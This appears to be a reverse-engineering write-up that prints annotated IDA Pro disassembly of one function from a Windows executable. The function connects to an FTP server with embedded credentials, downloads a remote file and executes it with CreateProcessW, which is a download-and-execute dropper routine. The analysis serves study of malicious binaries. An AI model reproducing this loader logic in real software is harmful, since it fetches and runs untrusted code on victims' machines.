# sub_401080 Function

The `sub_401080` function code of the Windows executable being reversed-engineered, as shown in IDA Pro:
    
    .text:00401080 ; ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦ S U B R O U T I N E ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦
    .text:00401080
    .text:00401080 ; Attributes: bp-based frame
    .text:00401080
    .text:00401080 proc            sub_401080 near         ; CODE XREF: _main+99p
    .text:00401080
    .text:00401080 var_68          = dword ptr -68h
    .text:00401080 var_3C          = dword ptr -3Ch
    .text:00401080 hInternet       = dword ptr -1Ch
    .text:00401080 hHandle         = dword ptr -18h
    .text:00401080 lpStartupInfo   = dword ptr -8
    .text:00401080 hConnect        = dword ptr -4
    .text:00401080
    .text:00401080                 push    ebp
    .text:00401081                 mov     ebp, esp
    .text:00401083                 sub     esp, 68h ; reserve space (68h) on the stack for local variables
    .text:00401086                 push    0               ; dwReserved
    .text:00401088                 call    [ds:InternetAttemptConnect] ; attempt/test connecting to the internet before issuing any requests // https://docs.microsoft.com/en-us/windows/desktop/api/wininet/nf-wininet-internetattemptconnect
    .text:0040108E                 test    eax, eax ; eax = 0h
    .text:00401090                 jnz     loc_401151 ; if not zero, Z=0, jump to 401151
    .text:00401096                 push    0               ; dwFlags
    .text:00401098                 push    0               ; lpszProxyBypass 
    .text:0040109A                 push    0               ; lpszProxy 
    .text:0040109C                 push    0               ; dwAccessType 
    .text:0040109E                 push    0               ; lpszAgent 
    .text:004010A0                 call    [ds:InternetOpenW] ; initialize the application's use of WinINet functions // https://docs.microsoft.com/en-us/windows/desktop/api/wininet/nf-wininet-internetopenw
    .text:004010A6                 mov     [ebp+hInternet], eax ; eax = 00CC0004h
    .text:004010A9                 push    0               ; dwContext 
    .text:004010AB                 push    8000000h        ; dwFlags 
    .text:004010B0                 push    1               ; dwService
    .text:004010B2                 push    offset szPassword ; lpszPassword 
    .text:004010B7                 push    offset szUserName ; lpszUserName 
    .text:004010BC                 push    15h             ; nServerPort 
    .text:004010BE                 push    offset szServerName ; lpszServerName 
    .text:004010C3                 mov     eax, [ebp+hInternet] 
    .text:004010C6                 push    eax             ; hInternet = 00CC0004h
    .text:004010C7                 call    [ds:InternetConnectW] ; Opens an File Transfer Protocol (FTP) or HTTP session for a given site // https://docs.microsoft.com/en-us/windows/desktop/api/wininet/nf-wininet-internetconnectw
    .text:004010CD                 mov     [ebp+hConnect], eax ; eax = 0h
    .text:004010D0                 push    0               ; dwContext
    .text:004010D2                 push    2               ; dwFlags
    .text:004010D4                 push    20h             ; dwFlagsAndAttributes
    .text:004010D6                 push    0               ; fFailIfExists
    .text:004010D8                 push    offset szRemoteFile ; lpszNewFile
    .text:004010DD                 push    offset szRemoteFile ; lpszRemoteFile
    .text:004010E2                 mov     ecx, [ebp+hConnect]
    .text:004010E5                 push    ecx             ; hConnect = 0h
    .text:004010E6                 call    [ds:FtpGetFileW] ; Retrieves a file from the FTP server and stores it under the specified file name, creating a new local file in the process // https://docs.microsoft.com/en-us/windows/desktop/api/wininet/nf-wininet-ftpgetfilew
    .text:004010EC                 mov     edx, [ebp+hConnect]
    .text:004010EF                 push    edx             ; hConnect
    .text:004010F0                 call    [ds:InternetCloseHandle] ; Closes a single Internet handle // https://docs.microsoft.com/en-us/windows/desktop/api/wininet/nf-wininet-internetclosehandle
    .text:004010F6                 mov     eax, [ebp+hInternet] 
    .text:004010F9                 push    eax             ; hInternet = 0h
    .text:004010FA                 call    [ds:InternetCloseHandle] ; Closes a single Internet handle // https://docs.microsoft.com/en-us/windows/desktop/api/wininet/nf-wininet-internetclosehandle 
    .text:00401100                 push    44h             ; size_t - Number of characters
    .text:00401102                 push    0               ; int - Character to set
    .text:00401104                 lea     ecx, [ebp+var_68] ; 
    .text:00401107                 push    ecx             ; void * - Pointer to destination
    .text:00401108                 call    _memset ; Sets buffers to a specified character // https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/memset-wmemset?view=vs-2017
    .text:0040110D                 add     esp, 0Ch
    .text:00401110                 mov     [ebp+var_68], 44h
    .text:00401117                 mov     [ebp+var_3C], 100h
    .text:0040111E                 lea     edx, [ebp+var_68]
    .text:00401121                 mov     [ebp+lpStartupInfo], edx
    .text:00401124                 lea     eax, [ebp+hHandle]
    .text:00401127                 push    eax             ; lpProcessInformation
    .text:00401128                 mov     ecx, [ebp+lpStartupInfo]
    .text:0040112B                 push    ecx             ; lpStartupInfo
    .text:0040112C                 push    0               ; lpCurrentDirectory
    .text:0040112E                 push    0               ; lpEnvironment
    .text:00401130                 push    0               ; dwCreationFlags
    .text:00401132                 push    0               ; bInheritHandles
    .text:00401134                 push    0               ; lpThreadAttributes
    .text:00401136                 push    0               ; lpProcessAttributes
    .text:00401138                 push    offset szRemoteFile ; lpCommandLine
    .text:0040113D                 push    0               ; lpApplicationName
    .text:0040113F                 call    [ds:CreateProcessW] ; Creates a new process and its primary thread // https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createprocessw
    .text:00401145                 push    0FFFFFFFFh      ; dwMilliseconds - The time-out interval, in milliseconds
    .text:00401147                 mov     edx, [ebp+hHandle] 
    .text:0040114A                 push    edx             ; hHandle
    .text:0040114B                 call    [ds:WaitForSingleObject] ; Waits until the specified object is in the signaled state or the time-out interval elapses // https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject
    .text:00401151
    .text:00401151 loc_401151:                             ; CODE XREF: sub_401080+10j
    .text:00401151                 mov     esp, ebp
    .text:00401153                 pop     ebp
    .text:00401154                 retn
    .text:00401154 endp            sub_401080